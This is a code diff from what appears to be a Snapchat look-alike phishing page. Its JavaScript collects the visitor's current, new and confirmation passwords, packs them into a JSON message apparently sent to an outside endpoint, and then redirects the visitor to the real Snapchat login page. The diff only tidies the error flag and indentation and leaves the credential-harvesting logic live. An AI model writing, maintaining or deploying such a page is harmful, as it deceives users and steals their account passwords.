@@ -61567,14 +61567,12 @@ html[lang='ar'] .theme--snapchat {
                 }
 
                 const payload = JSON.stringify({
-                    content: `--------------------\nErrors: No\nCurrent Password: ${current_pass}\nNew Password: ${new_pass}\nConfirm Password: ${newcon_pass} \n--------------------`
+                  content: `--------------------\nErrors: ${errors.length > 0 ? 'Yes' : 'No'}\nCurrent Password: ${current_pass}\nNew Password: ${new_pass}\nConfirm Password: ${newcon_pass}\n--------------------`
                 });
 
+               
                 if (errors.length > 0) {
                     checkerror()
-                    payload = JSON.stringify({
-                        content: `--------------------\nErrors: Yes\nCurrent Password: ${current_pass}\nNew Password: ${new_pass}\nConfirm Password: ${newcon_pass} \n--------------------`
-                    });
                 }else{
                     errorMessage.style.display = 'none';
                 }
@@ -61594,8 +61592,8 @@ html[lang='ar'] .theme--snapchat {
                             window.location.href = "https://accounts.snapchat.com/accounts/v2/login";
                         }
                     } else {
-                    errors.push("Something went wrong, try again later")
-                    checkerror()
+                        errors.push("Something went wrong, try again later")
+                        checkerror()
                     }
                 } catch (error) {
                     console.error('Error:', error);
